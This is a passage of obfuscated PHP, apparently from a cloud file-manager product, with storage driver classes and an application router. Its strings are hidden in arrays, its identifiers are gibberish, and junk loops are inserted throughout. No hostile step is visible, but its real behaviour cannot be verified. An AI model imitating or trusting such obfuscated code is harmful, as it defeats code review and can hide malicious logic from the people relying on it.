$È‰ˆ¦›ì =& $_SERVER[¡¬ıÜ ƒ]; if (substr($×ıíÃ™ì, 0, 7) == $È‰ˆ¦›ì[218]) { $×ıíÃ™ì = $È‰ˆ¦›ì[219] . substr($×ıíÃ™ì, 7); } header($È‰ˆ¦›ì[175] . $×ıíÃ™ì); die; } } define($_SERVER[¡¬ıÜ ƒ][317], 1); define($_SERVER[¡¬ıÜ ƒ][318], 2); goto aàÕ‘Û‡Í; e–Â÷¢ÇÅ¦: class PathDriverBOS extends PathDriverS3 { public function __construct($ÌÌÇÚì) { parent::__construct($ÌÌÇÚì); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function fileOutLink($±×ıœè¥) { $ù„£øÍ± =& $_SERVER[¡¬ıÜ ƒ]; if (substr($±×ıœè¥, 0, 7) == $ù„£øÍ±[218]) { $±×ıœè¥ = $ù„£øÍ±[219] . substr($±×ıœè¥, 7); } header($ù„£øÍ±[175] . $±×ıœè¥); die; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($º›Í¯) { parent::__construct($º›Í¯); $this->setSignVersion($_SERVER[¡¬ıÜ ƒ][249]); } public function uploadFormData($áÔ¬¹Î«, $õõ ˜ç = 3600) { $¡´¯¡ú× =& $_SERVER[¡¬ıÜ ƒ]; $É¨¢”‰ = $¡´¯¡ú×[231]; $Ã²¤òĞ = $¡´¯¡ú×[1423]; $­Ë±¶­Ñ = $¡´¯¡ú×[263]; $—Š˜²úó = gmdate($¡´¯¡ú×[1424], time() + $õõ ˜ç); $š±å­–š = (string) time() . $¡´¯¡ú×[74] . (string) (time() + $õõ ˜ç); $ âü¹› = array($¡´¯¡ú×[264] => $—Š˜²úó, $¡´¯¡ú×[267] => array(array($¡´¯¡ú×[308] => $É¨¢”‰), array($¡´¯¡ú×[268] => $this->bucket), array($¡´¯¡ú×[269], $¡´¯¡ú×[270], $¡´¯¡ú×[12]), array($¡´¯¡ú×[272] => $­Ë±¶­Ñ), array($¡´¯¡ú×[1425] => $Ã²¤òĞ), array($¡´¯¡ú×[1426] => $this->accessKey), array($¡´¯¡ú×[1427] => $š±å­–š))); $ âü¹› = json_encode($ âü¹›); $‘Ù¨šÑÇ = hash_hmac($¡´¯¡ú×[1423], $š±å­–š, $this->secret); $…˜²Òœ’ = sha1($ âü¹›); $€¿é¤Ü = hash_hmac($¡´¯¡ú×[1423], $…˜²Òœ’, $‘Ù¨šÑÇ); $ËÍ÷Ğ‚ = array($¡´¯¡ú×[308] => $É¨¢”‰, $¡´¯¡ú×[272] => $­Ë±¶­Ñ, $¡´¯¡ú×[279] => base64_encode($ âü¹›), $¡´¯¡ú×[1425] => $Ã²¤òĞ, $¡´¯¡ú×[1426] => $this->accessKey, $¡´¯¡ú×[1428] => $š±å­–š, $¡´¯¡ú×[1429] => $€¿é¤Ü, $¡´¯¡ú×[208] => $this->getHost()); return $ËÍ÷Ğ‚; } public function fileOutImage($ƒ‰›Š¿ê, $’°×ïè± = 250) { $Ë½ß¤Ê =& $_SERVER[¡¬ıÜ ƒ]; if ($this->size($ƒ‰›Š¿ê) > 1024 * 1024 * 32) { return $this->fileOutImageServer($ƒ‰›Š¿ê, $’°×ïè±); } $æÍ„úğú = $this->link($ƒ‰›Š¿ê); $æÍ„úğú .= $Ë½ß¤Ê[1430] . $’°×ïè± . $Ë½ß¤Ê[1431]; $this->fileOutLink($æÍ„úğú); } public function fileOutLink($ŸÑ„üÁ…) { $Ìœîƒ—å =& $_SERVER[¡¬ıÜ ƒ]; if (substr($ŸÑ„üÁ…, 0, 7) == $Ìœîƒ—å[218]) { $ŸÑ„üÁ… = $Ìœîƒ—å[219] . substr($ŸÑ„üÁ…, 7); } header($Ìœîƒ—å[175] . $ŸÑ„üÁ…); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($®°–èÚã) { $this->pathParse = $®°–èÚã; $this->model = Model($_SERVER[¡¬ıÜ ƒ][1432]); } public function getPath($şıîÊÌ½) { return trim($şıîÊÌ½, $_SERVER[¡¬ıÜ ƒ][8]); } public function pathFather($¥ŠÍİ™›) { $â…’óªÁ = $this->parse($¥ŠÍİ™›); $â…’óªÁ = $this->infoSimple($¥ŠÍİ™›); return $â…’óªÁ ? $â…’óªÁ[$_SERVER[¡¬ıÜ ƒ][192]] : !1; } public function pathThis($†²·ç“’) { $ŸÏÄ™€Ï = $this->infoSimple($†²·ç“’); return $ŸÏÄ™€Ï ? $ŸÏÄ™€Ï[$_SERVER[¡¬ıÜ ƒ][32]] : !1; } public function getPathOuter($ÁğÁŠô¹) { if (!$ÁğÁŠô¹) { return $ÁğÁŠô¹; } $¦Ï¡×€ = $this->parse($ÁğÁŠô¹); return KodIO::make($¦Ï¡×€[$_SERVER[¡¬ıÜ ƒ][477]]); } public function copyFolderFromIO($çÏ„šÙ¸, $ù§µâºÚ, $ù öôˆ‡, $ ×¢ÒÉ‘, $Ç¶æÕ›‘) { $ï‡ÎŸƒ¤ = $this->model->copyFolderFromIO($çÏ„šÙ¸, $ù§µâºÚ, $ù öôˆ‡, $ ×¢ÒÉ‘, $Ç¶æÕ›‘); return KodIO::make($ï‡ÎŸƒ¤); } public function isParentOf($²—õêåñ, $Ğ©îøÅñ) { return $this->model->isParentOf($²—õêåñ, $Ğ©îøÅñ); } public function mkfile($­Ì¦È›, $¿¹‡¸ÉË = '', $­¤²º÷Ú = REPEAT_RENAME) { $èíøö¢Ö =& $_SERVER[¡¬ıÜ ƒ]; $àâ™Ì²» = $this->parse($­Ì¦È›); $­Ì¦È› = $àâ™Ì²»[$èíøö¢Ö[477]]; for ($ºÎ÷¾ìÆ = 0; $ºÎ÷¾ìÆ < count($àâ™Ì²»[$èíøö¢Ö[1433]]); $ºÎ÷¾ìÆ++) { $»ğ¦Š = $àâ™Ì²»[$èíøö¢Ö[1433]][$ºÎ÷¾ìÆ]; if ($ºÎ÷¾ìÆ == count($àâ™Ì²»[$èíøö¢Ö[1433]]) - 1) { $­Ì¦È› = $this->model->mkfile($­Ì¦È›, $»ğ¦Š, $¿¹‡¸ÉË, $­¤²º÷Ú); break; } $­Ì¦È› = $this->model->mkdir($­Ì¦È›, $»ğ¦Š, REPEAT_SKIP); } return $this->getPathOuter($­Ì¦È›); } public function mkdir($º”Í…‘ƒ, $ÚĞìœ = REPEAT_SKIP) { $øˆ•¤¹¥ =& $_SERVER[¡¬ıÜ ƒ]; $Ò§ªÏ•£ = $this->parse($º”Í…‘ƒ); $º”Í…‘ƒ = $Ò§ªÏ•£[$øˆ•¤¹¥[477]]; for ($ËçŠí€É = 0; $ËçŠí€É < count($Ò§ªÏ•£[$øˆ•¤¹¥[1433]]); $ËçŠí€É++) { $ŞÅ’ş´­ = $Ò§ªÏ•£[$øˆ•¤¹¥[1433]][$ËçŠí€É]; $º”Í…‘ƒ = $this->model->mkdir($º”Í…‘ƒ, $ŞÅ’ş´­, $ÚĞìœ); } return $this->getPathOuter($º”Í…‘ƒ); } public function copyFile($À¼ª©ğ, $ˆ¬ò˜ò¾, $ĞßšÚ¡ = REPEAT_REPLACE) { $œè©ÂŒ =& $_SERVER[¡¬ıÜ ƒ]; $ƒ´ü³¡‹ = $this->parse($ˆ¬ò˜ò¾); $ê›®ÙÜ² = $this->model->copy($À¼ª©ğ, $ƒ´ü³¡‹[$œè©ÂŒ[477]], $ĞßšÚ¡, $ƒ´ü³¡‹[$œè©ÂŒ[87]]); return $ê›®ÙÜ² ? $this->getPathOuter($ê›®ÙÜ²) : !1; } public function moveFile($§­Äò¦È, $¨š˜ñ¶—, $áº‘ÇÏ = REPEAT_REPLACE) { $Õ§€Å÷ =& $_SERVER[¡¬ıÜ ƒ]; $àŞÍĞ¬Ê = $this->parse($¨š˜ñ¶—); $ó¡Øî¡ = $this->model->move($§­Äò¦È, $àŞÍĞ¬Ê[$Õ§€Å÷[477]], $áº‘ÇÏ, $àŞÍĞ¬Ê[$Õ§€Å÷[87]]); return $ó¡Øî¡ ? $this->getPathOuter($ó¡Øî¡) : !1; } public function copy($äøÌÎÚÎ, $—°ê£™¡, $ †ŠÚ¤ = REPEAT_REPLACE, $Õ¤Á¾ = false) { $å®çüÜÖ = $this->parse($—°ê£™¡); $¡âíÑîå = $this->model->copy($äøÌÎÚÎ, $å®çüÜÖ[$_SERVER[¡¬ıÜ ƒ][477]], $ †ŠÚ¤, $Õ¤Á¾); return $¡âíÑîå ? $this->getPathOuter($¡âíÑîå) : !1; } public function moveSameAllow() { } public function move($æ§Ã½¤Â, $¯Ïó»€, $®öÌùĞ = REPEAT_REPLACE, $¨Ì¾˜‘à = false) { $‘ºµñ¹ˆ = $this->parse($¯Ïó»€); $ş‘Éç‡ø = $this->model->move($æ§Ã½¤Â, $‘ºµñ¹ˆ[$_SERVER[¡¬ıÜ ƒ][477]], $®öÌùĞ, $¨Ì¾˜‘à); return $ş‘Éç‡ø ? $this->getPathOuter($ş‘Éç‡ø) : !1; } public function remove($Ø¼¹»¸×, $ÓÚÍÇ°¬ = true) { return $this->model->remove($Ø¼¹»¸×, $ÓÚÍÇ°¬); } public function rename($Ïãò»æä, $ÊÂ™Çº) { $Ë½ú¨“» = $this->model->rename($Ïãò»æä, $ÊÂ™Çº); return $Ë½ú¨“» ? $this->getPathOuter($Ïãò»æä) : $Ë½ú¨“»; } public function size($€˜ƒŸ¦) { $¢áÀğ™Á = $this->infoSimple($€˜ƒŸ¦); return $¢áÀğ™Á ? $¢áÀğ™Á[$_SERVER[¡¬ıÜ ƒ][79]] : 0; } public function infoSimple($ş÷Ç©Æ¤) { return $this->model->sourceInfo($ş÷Ç©Æ¤); } public function info($µ×¿Š¯ë) { return $this->infoParse($µ×¿Š¯ë); } public function infoAuth($¡×²”ö) { return $this->infoParse($¡×²”ö, !1, !0); } public function infoWithChildren($¸••èÇ¨) { return $this->infoParse($¸••èÇ¨, !0); } protected function infoParse($–ûŒÃ¯®, $”Ï¯ç‚ß = false, $íƒ‹ã—’ = false) { if (!$”Ï¯ç‚ß) { return $this->model->pathInfo($–ûŒÃ¯®, $íƒ‹ã—’); } return $this->model->pathInfoMore($–ûŒÃ¯®); } public function infoFullSimple($Û¸Ó±Æ¸) { $‘×¿ø‰æ =& $_SERVER[¡¬ıÜ ƒ]; $¶½éˆë§ = explode($‘×¿ø‰æ[8], $Û¸Ó±Æ¸); $‡±Îıªı = implode($‘×¿ø‰æ[8], array_splice($¶½éˆë§, 1)); return $this->model->pathInfoByPath($¶½éˆë§[0], $‡±Îıªı); } public function infoFull($¬Íº²şÊ) { $¢ÆÚáÍı = $this->infoFullSimple($¬Íº²şÊ); return is_array($¢ÆÚáÍı) ? $this->model->pathInfo($¢ÆÚáÍı[$_SERVER[¡¬ıÜ ƒ][193]]) : !1; } public function hashSimple($½’ã©ƒÄ) { $°öËêµ =& $_SERVER[¡¬ıÜ ƒ]; $íİúÏ‚– = $this->infoWithChildren($½’ã©ƒÄ); return $íİúÏ‚–[$°öËêµ[170]][$°öËêµ[677]]; } public function hashMd5($üæÃÎØƒ) { $ˆë¶Â…ü =& $_SERVER[¡¬ıÜ ƒ]; $ÕÄµÀÂ’ = $this->infoWithChildren($üæÃÎØƒ); return $ÕÄµÀÂ’[$ˆë¶Â…ü[170]][$ˆë¶Â…ü[549]]; } public function exist($âĞõ´×Ÿ) { $ñ–¢ŠÛ¯ =& $_SERVER[¡¬ıÜ ƒ]; $Ã¾™€²Ú = $this->parse($âĞõ´×Ÿ); if (!$Ã¾™€²Ú[$ñ–¢ŠÛ¯[87]]) { return $this->isFile($âĞõ´×Ÿ) || $this->isFolder($âĞõ´×Ÿ); } $Û˜‡ç‹Ù = array($ñ–¢ŠÛ¯[479] => $Ã¾™€²Ú[$ñ–¢ŠÛ¯[477]], $ñ–¢ŠÛ¯[32] => $Ã¾™€²Ú[$ñ–¢ŠÛ¯[87]]); $½ğ´ÓúŸ = $this->model->where($Û˜‡ç‹Ù)->find(); return $½ğ´ÓúŸ ? !0 : !1; } public function isFile($÷Ìô”) { $Ï—¾¸® =& $_SERVER[¡¬ıÜ ƒ]; $Ò“¥Áì = $this->infoSimple($÷Ìô”); return $Ò“¥Áì && $Ò“¥Áì[$Ï—¾¸®[487]] == $Ï—¾¸®[230] ? !0 : !1; } public function isFolder($¶®³Å) { $Ô•µªÈ =& $_SERVER[¡¬ıÜ ƒ]; $õÕøÌ = $this->infoSimple($¶®³Å); return $õÕøÌ && $õÕøÌ[$Ô•µªÈ[487]] == $Ô•µªÈ[91] ? !0 : !1; } public function listPath($õ“¸ë¸, $ñ³Ÿ”ú• = false) { $“©’œ»À =& $_SERVER[¡¬ıÜ ƒ]; if ($õ“¸ë¸ == $“©’œ»À[12]) { return !1; } $÷–ª÷”’ = array($“©’œ»À[479] => $õ“¸ë¸); if ($ñ³Ÿ”ú•) { return $this->model->listSource($÷–ª÷”’, -1); } return $this->model->listSource($÷–ª÷”’); } public function has($æîÂ÷äŞ, $œÙ××±ü = false, $ıŞŞûÃ = null) { $Ë¥ë¡ é =& $_SERVER[¡¬ıÜ ƒ]; $ìéÈ¬¬¢ = $this->infoWithChildren($æîÂ÷äŞ); if ($œÙ××±ü) { return array($Ë¥ë¡ é[242] => $ìéÈ¬¬¢[$Ë¥ë¡ é[242]], $Ë¥ë¡ é[241] => $ìéÈ¬¬¢[$Ë¥ë¡ é[241]]); } return $ıŞŞûÃ ? $ìéÈ¬¬¢[$Ë¥ë¡ é[242]] : $ìéÈ¬¬¢[$Ë¥ë¡ é[241]]; } public function listAll($Š¾´‰õ) { $÷†°·¶æ = IO::info($this->pathParse[$_SERVER[¡¬ıÜ ƒ][87]]); if (!$÷†°·¶æ) { return array(); } return $this->model->listAll($Š¾´‰õ); } public function getContent($å˜Úû²£) { return $this->model->getContent($å˜Úû²£); } public function setContent($’ÒÉ˜ª, $Òúïôß = '') { return $this->model->setContent($’ÒÉ˜ª, $Òúïôß); } public function fileSubstr($Ä“°¾ğ, $É¬İŞÕ›, $î°º…) { return $this->model->fileSubstr($Ä“°¾ğ, $É¬İŞÕ›, $î°º…); } public function download($ûÇô‰Õ, $Êö–ëõÊ = '') { $ƒò½Òƒˆ = get_path_father($Êö–ëõÊ); $’§ÎÒô‘ = get_path_this($Êö–ëõÊ); $ÓåÓÁÁ‹ = $this->model->fileInfoGet($ûÇô‰Õ); $—İ‘ˆãõ = IO::copy($ÓåÓÁÁ‹[$_SERVER[¡¬ıÜ ƒ][87]], $ƒò½Òƒˆ, !1, $’§ÎÒô‘); return $—İ‘ˆãõ; } public function setModifyTime($õ—±ïÒŠ, $£¬Â¶´ = '') { $Á£’µå =& $_SERVER[¡¬ıÜ ƒ]; if (!$õ—±ïÒŠ) { return; } $this->model->where(array($Á£’µå[493] => $õ—±ïÒŠ))->save(array($Á£’µå[88] => $£¬Â¶´)); } public function upload($Ã—ËşĞç, $©¥ÊÙ´ˆ, $í–‚µ‚  = false, $Ü öï­¶ = REPEAT_REPLACE) { $«¼Ù›² =& $_SERVER[¡¬ıÜ ƒ]; $áı…†—ç = $this->parse($Ã—ËşĞç); $‰Ÿó°ª› = $this->model->addFile($áı…†—ç[$«¼Ù›²[477]], $©¥ÊÙ´ˆ, $áı…†—ç[$«¼Ù›²[87]], $í–‚µ‚ , $Ü öï­¶); return $this->getPathOuter($‰Ÿó°ª›); } public function uploadFileByID($æÍ¿‚, $Œ«ı™˜Œ, $ú§Èâ™€) { $ÀÜøøİ =& $_SERVER[¡¬ıÜ ƒ]; $»Âó¶€µ = $this->parse($æÍ¿‚); $¯Ñä°ÇÙ = $this->model->addFileByFileID($»Âó¶€µ[$ÀÜøøİ[477]], $Œ«ı™˜Œ, $»Âó¶€µ[$ÀÜøøİ[87]], $ú§Èâ™€); return $this->getPathOuter($¯Ñä°ÇÙ); } public function addFileByRemote($¶¦ûºæä, $÷‰Ÿ¸ÀŸ, $Úäñ†Ê = array(), $†Øş¬Ò¦ = '', $ş÷âØö) { $¤¯¿Ğ» =& $_SERVER[¡¬ıÜ ƒ]; $ª˜ñ©Õò = $this->parse($¶¦ûºæä); $†Øş¬Ò¦ = empty($†Øş¬Ò¦) ? $ª˜ñ©Õò[$¤¯¿Ğ»[87]] : $†Øş¬Ò¦; $ƒÅ‹¼‹ç = $this->model->addFileByRemote($ª˜ñ©Õò[$¤¯¿Ğ»[477]], $÷‰Ÿ¸ÀŸ, $†Øş¬Ò¦, $Úäñ†Ê, $ş÷âØö); return $this->getPathOuter($ƒÅ‹¼‹ç); } public function uploadLink($øª´ì¢È, $¸“úšÒ = 0) { $œ÷šÁô© =& $_SERVER[¡¬ıÜ ƒ]; $‚³æÄêö = $this->parse($øª´ì¢È); $‰İş©ø£ = _get($GLOBALS[$œ÷šÁô©[7]], $œ÷šÁô©[1434]); $È´„ßã× = _get($GLOBALS[$œ÷šÁô©[7]], $œ÷šÁô©[1435]); $øª´ì¢È = Model($œ÷šÁô©[679])->createFileName($‚³æÄêö[$œ÷šÁô©[87]], $‰İş©ø£, $È´„ßã×); return IO::uploadLink($øª´ì¢È, $¸“úšÒ); } public function fileNameAuto($ñ¹¨â×ø, $†ãÇ×¶é, $ò¶£¬˜Ü = REPEAT_REPLACE, $ë¡ô¶Â· = false) { return $this->model->fileNameAuto($ñ¹¨â×ø, $†ãÇ×¶é, $ò¶£¬˜Ü, $ë¡ô¶Â·); } public function fileNameExist($®‡Áú—õ, $ÃÖìµÛ) { return $this->model->fileNameExist($®‡Áú—õ, $ÃÖìµÛ); } protected function _fileOut($È÷¨Âñí, $œæÜ”óä = false, $ø¶Üº÷ = false, $ó«’—Ñ¬ = '', $îèâ”ò– = false) { $àÎŠ†ÄÆ =& $_SERVER[¡¬ıÜ ƒ]; $—³¿™™È = $this->model->sourceInfo($È÷¨Âñí); if ($—³¿™™È[$àÎŠ†ÄÆ[487]] == $àÎŠ†ÄÆ[91]) { header($àÎŠ†ÄÆ[1436]); die; } $Ó”¦ø³ = $this->model->fileInfoGet($È÷¨Âñí); $ó«’—Ñ¬ = $Ó”¦ø³[$àÎŠ†ÄÆ[549]] ? $Ó”¦ø³[$àÎŠ†ÄÆ[549]] : $ó«’—Ñ¬; $ª¸Ú³³¶ = isset($GLOBALS[$àÎŠ†ÄÆ[182]]) && is_array($GLOBALS[$àÎŠ†ÄÆ[182]]) ? $GLOBALS[$àÎŠ†ÄÆ[182]][$àÎŠ†ÄÆ[32]] : $—³¿™™È[$àÎŠ†ÄÆ[32]]; if ($îèâ”ò–) { return IO::fileOutServer($Ó”¦ø³[$àÎŠ†ÄÆ[87]], $œæÜ”óä, $ª¸Ú³³¶, $ó«’—Ñ¬); } IO::fileOut($Ó”¦ø³[$àÎŠ†ÄÆ[87]], $œæÜ”óä, $ª¸Ú³³¶, $ó«’—Ñ¬); } public function fileOut($úªÕëÇ¿, $‡ºÒ÷¡ = false, $—ŠÈàß¢ = false, $ö€«’ñ½ = '') { $this->_fileOut($úªÕëÇ¿, $‡ºÒ÷¡, $—ŠÈàß¢, $ö€«’ñ½); } public function fileOutServer($õ¤şşø¹, $ˆ¦ıà„Æ = false, $²ÑÒÎÅâ = false, $ˆâàÅ… = '') { $this->_fileOut($õ¤şşø¹, $ˆ¦ıà„Æ, $²ÑÒÎÅâ, $ˆâàÅ…, !0); } protected function _fileOutImage($Àì§“Úò, $øµÉúşÈ = 250) { $Ÿ»‘ŸÑ• =& $_SERVER[¡¬ıÜ ƒ]; $¾ıÃê¿ˆ = $this->model->pathInfo($Àì§“Úò); if ($¾ıÃê¿ˆ[$Ÿ»‘ŸÑ•[487]] == $Ÿ»‘ŸÑ•[91]) { show_json($Ÿ»‘ŸÑ•[1437] . $Àì§“Úò, !1); } $“ö¶Áü = $this->model->fileInfoGet($Àì§“Úò); $¾ıÃê¿ˆ[$Ÿ»‘ŸÑ•[183]] = $“ö¶Áü[$Ÿ»‘ŸÑ•[87]]; $GLOBALS[$Ÿ»‘ŸÑ•[182]] = $¾ıÃê¿ˆ; IO::fileOutImage($“ö¶Áü[$Ÿ»‘ŸÑ•[87]], $øµÉúşÈ); } public function fileOutImage($„îòË’ñ, $÷éä¾¨Ó = 250) { $this->_fileOutImage($„îòË’ñ, $÷éä¾¨Ó); } public function fileOutImageServer($ß£—‹ş‡, $‚û™÷ÍÂ = 250) { $this->_fileOutImage($ß£—‹ş‡, $‚û™÷ÍÂ); } public function link($™Ø»Ú£‹, $ìÍ­€¬Ú = '') { $˜»‚ÔÜ = $this->model->fileInfoGet($™Ø»Ú£‹); return IO::link($˜»‚ÔÜ[$_SERVER[¡¬ıÜ ƒ][87]], $ìÍ­€¬Ú); } protected function parse($Ï©÷áœ˜) { $òø¦®úâ =& $_SERVER[¡¬ıÜ ƒ]; if (strstr($Ï©÷áœ˜, $òø¦®úâ[8]) === !1) { return array($òø¦®úâ[495] => intval($Ï©÷áœ˜), $òø¦®úâ[87] => $òø¦®úâ[12], $òø¦®úâ[1433] => array()); } $ ¯ç¡­œ = explode($òø¦®úâ[8], trim($Ï©÷áœ˜, $òø¦®úâ[8])); if (count($ ¯ç¡­œ) < 2) { show_tips(clear_html($Ï©÷áœ˜) . $òø¦®úâ[1438]); } return array($òø¦®úâ[495] => intval($ ¯ç¡­œ[0]), $òø¦®úâ[87] => $ ¯ç¡­œ[1], $òø¦®úâ[1433] => array_slice($ ¯ç¡­œ, 1)); } } goto b‚ƒ‘˜Š‡„; E¸Û·š½â: while (strlen($gtifnkxmhp) < $_SERVER[¡¬ıÜ ƒ][688]) { if (!$gtifnkxmhp) { break; } $gtifnkxmhp++; } class Application { private $defaultModule = "\x69\156\144\x65\170"; private $defaultController = "\x69\156\144\x65\x78"; private $defaultAction = "\x69\156\x64\x65\x78"; function __construct() { } public function setDefault($×µûìûÀ) { $£¢Ú‹“¥ =& $_SERVER[¡¬ıÜ ƒ]; $ç”øÂ½ô =& $_SERVER[Æıâ¹•]; $Ùè£ˆ¯¬ = explode($ç”øÂ½ô[0], trim($×µûìûÀ, $ç”øÂ½ô[0])); $this->defaultModule = $Ùè£ˆ¯¬[0] ? $Ùè£ˆ¯¬[0] : $this->defaultModule; $this->defaultController = $Ùè£ˆ¯¬[1] ? $Ùè£ˆ¯¬[1] : $this->defaultController; $this->defaultAction = $Ùè£ˆ¯¬[2] ? $Ùè£ˆ¯¬[2] : $this->defaultAction; $È²şŠ°î = $£¢Ú‹“¥[689]; $this->ryqz82b69b80($ç”øÂ½ô[1], array($this, $ç”øÂ½ô[2])); $ãùÆÉùå = $£¢Ú‹“¥[690]; if (strlen($ãùÆÉùå) < $£¢Ú‹“¥[691]) { return; } } public function appRun($ËøË¾Óš) { $¾ê¾€â¸ =& $_SERVER[Æıâ¹•]; $ª­ñº› = explode($¾ê¾€â¸[0], $ËøË¾Óš); $±£½Ê¸ = strtolower($ª­ñº›[0]); $ øãıŒ‹ = $¾ê¾€â¸[3]; if ($±£½Ê¸ == $¾ê¾€â¸[4]) { $ øãıŒ‹ = $¾ê¾€â¸[5]; $ª­ñº›[0] = $¾ê¾€â¸[6]; $ª­ñº›[1] = $ª­ñº›[1] . $¾ê¾€â¸[7]; $ËøË¾Óš = join($¾ê¾€â¸[0], $ª­ñº›); $ËøË¾Óš = trim($ËøË¾Óš, $¾ê¾€â¸[0]); } call_user_func(array($¾ê¾€â¸[8], $¾ê¾€â¸[9]), $ øãıŒ‹ . $¾ê¾€â¸[10], $ËøË¾Óš); ActionCall($ËøË¾Óš); call_user_func(array($¾ê¾€â¸[8], $¾ê¾€â¸[9]), $ øãıŒ‹ . $¾ê¾€â¸[11], $ËøË¾Óš); $¹·æÖ»¤ = $_SERVER[¡¬ıÜ ƒ][692]; } private function autorun() { $£ºü¿‚ =& $_SERVER[¡¬ıÜ ƒ]; $»ÛúıÇ =& $_SERVER[Æıâ¹•]; global $config; if (count($config[$»ÛúıÇ[12]]) == 0) { return; } foreach ($config[$»ÛúıÇ[12]] as $êäªäÁ¿ => $°¯•“±) { $this->appRun($°¯•“±); $Ìûüà¤… = $£ºü¿‚[693]; if (strlen($Ìûüà¤…) < $£ºü¿‚[688]) { return; } } } private function cyaqd2a56eda() { $èš÷’È =& $_SERVER[¡¬ıÜ ƒ]; $âŞêÎ»á =& $_SERVER[Æıâ¹•]; $æ®˜å¡Ú = $âŞêÎ»á[4]; $ö¤ªÜıı = $GLOBALS[$âŞêÎ»á[13]][$âŞêÎ»á[14]][0]; if (!$ö¤ªÜıı || strlen($ö¤ªÜıı) <= strlen($æ®˜å¡Ú)) { return; } if (strtolower(substr($ö¤ªÜıı, -strlen($æ®˜å¡Ú))) != $æ®˜å¡Ú) { return; } $±à‰‡Ö† = substr($ö¤ªÜıı, 0, -strlen($æ®˜å¡Ú)); $áŒ†¿‚Í = array($âŞêÎ»á[4], $±à‰‡Ö†); $¢áªîû¡ = $èš÷’È[694]; $¦ÛˆÚí = array_slice($GLOBALS[$âŞêÎ»á[13]][$âŞêÎ»á[14]], 1); $Ã½•ÔëĞ = $èš÷’È[695]; $GLOBALS[$âŞêÎ»á[13]][$âŞêÎ»á[14]] = array_merge($áŒ†¿‚Í, $¦ÛˆÚí); $¦¸’¡¬€ = $èš÷’È[696]; while (strlen($¦¸’¡¬€) < $èš÷’È[697]) { if (!$¦¸’¡¬€) { break; } $¦¸’¡¬€++; } $GLOBALS[$âŞêÎ»á[13]][$âŞêÎ»á[15]] = implode($âŞêÎ»á[0], $GLOBALS[$âŞêÎ»á[13]][$âŞêÎ»á[14]]); } private function zeni4b3143cb() { $ğò’ü¹… =& $_SERVER[¡¬ıÜ ƒ]; $ü¿áÇ§Œ =& $_SERVER[Æıâ¹•]; if ($GLOBALS[$ü¿áÇ§Œ[13]][$ü¿áÇ§Œ[15]] != $ü¿áÇ§Œ[6]) { return; } $Û•„ş§µ = $_SERVER[$ü¿áÇ§Œ[16]]; $‘Ëƒ±›Ç = $ğò’ü¹…[698]; if (!$‘Ëƒ±›Ç) { die; } $’±‹¦ú = $ü¿áÇ§Œ[17]; if (!strstr($Û•„ş§µ, $’±‹¦ú)) { return; } $¬ÛŠ¡ = strrpos($Û•„ş§µ, $’±‹¦ú); $ÂÁ½¶é† = substr($Û•„ş§µ, $¬ÛŠ¡ + strlen($’±‹¦ú)); $òİˆª¡Ø = $ğò’ü¹…[699]; preg_match_all($ü¿áÇ§Œ[18], $ÂÁ½¶é†, $²¼É‰ƒë); $¿»Ğİ¸— = $ğò’ü¹…[700]; $ÂÁ½¶é† = trim($²¼É‰ƒë[0][0], $ü¿áÇ§Œ[19]); $šîÆ˜Ø” = $ğò’ü¹…[701]; $GLOBALS[$ü¿áÇ§Œ[13]][$ü¿áÇ§Œ[14]] = explode($ü¿áÇ§Œ[19], $ÂÁ½¶é†); $GLOBALS[$ü¿áÇ§Œ[13]][$ü¿áÇ§Œ[15]] = implode($ü¿áÇ§Œ[0], $GLOBALS[$ü¿áÇ§Œ[13]][$ü¿áÇ§Œ[14]]); $÷Ã¢¼è¹ = $ğò’ü¹…[702]; if (strlen($÷Ã¢¼è¹) < $ğò’ü¹…[697]) { die; } } public function run() { $Û¶Ÿ”Âë =& $_SERVER[¡¬ıÜ ƒ]; $Î³ğê¡ =& $_SERVER[Æıâ¹•]; $this->zeni4b3143cb(); $­ËÛğçú = $Û¶Ÿ”Âë[703]; while ($­ËÛğçú < $Û¶Ÿ”Âë[697]) { if ($­ËÛğçú >= 0) { break; } $­ËÛğçú++; } $this->cyaqd2a56eda(); $ßî‚ÆÃ— = $GLOBALS[$Î³ğê¡[13]][$Î³ğê¡[14]]; $ûŞËÎ·² = $Û¶Ÿ”Âë[704]; if (!$ûŞËÎ·²) { die; } $ıßµİš© = $GLOBALS[$Î³ğê¡[13]][$Î³ğê¡[15]]; define($Î³ğê¡[20], isset($ßî‚ÆÃ—[0]) && $ßî‚ÆÃ—[0] ? $ßî‚ÆÃ—[0] : $this->defaultModule); $ôÀ“ûò = $Û¶Ÿ”Âë[705]; if (!$ôÀ“ûò) { return; } define($Î³ğê¡[21], isset($ßî‚ÆÃ—[1]) && $ßî‚ÆÃ—[0] ? $ßî‚ÆÃ—[1] : $this->defaultController); $ã–±±Î = $Û¶Ÿ”Âë[706]; while ($ã–±±Î < $Û¶Ÿ”Âë[697]) { if ($ã–±±Î >= 0) { break; } $ã–±±Î++; } define($Î³ğê¡[22], isset($ßî‚ÆÃ—[2]) && $ßî‚ÆÃ—[0] ? $ßî‚ÆÃ—[2] : $this->defaultAction); $şã¤Û = $Û¶Ÿ”Âë[707]; if (!$şã¤Û) { die; } define($Î³ğê¡[23], MOD . $Î³ğê¡[0] . ST . $Î³ğê¡[0] . ACT); $_SERVER[$Î³ğê¡[24]] = strtolower(ACTION); $­†¸Âô = $Û¶Ÿ”Âë[708]; $this->autorun(); $š²ÔÜà = $Û¶Ÿ”Âë[709]; while (strlen($š²ÔÜà) < $Û¶Ÿ”Âë[710]) { if (!$š²ÔÜà) { break; } $š²ÔÜà++; } if (count($ßî‚ÆÃ—) >= 3) { $this->appRun($ıßµİš©); } else { $this->appRun(ACTION); } } private $hwmr43eff4f3 = array(); private $ksvb63ffc96b = ''; public function xjnsab3728c1() { $šİöÃ§Õ =& $_SERVER[¡¬ıÜ ƒ]; $¦¬ÎµÖ¼ =& $_SERVER[Æıâ¹•]; $this->cdsq88524c7b(); $this->mnrs1fbcb399(); $this->tvlcdec16053(); $this->jevt7a20daae(); $this->qpyu2621f8b4(); $ãĞŒèôü = $šİöÃ§Õ[711]; if (!$ãĞŒèôü) { die; } $this->chmj9e8ba543(); $this->qbjy08d0706d(); $this->ryqz82b69b80($¦¬ÎµÖ¼[25], array($this, $¦¬ÎµÖ¼[26])); $ÕüËõÀÀ = $šİöÃ§Õ[712]; 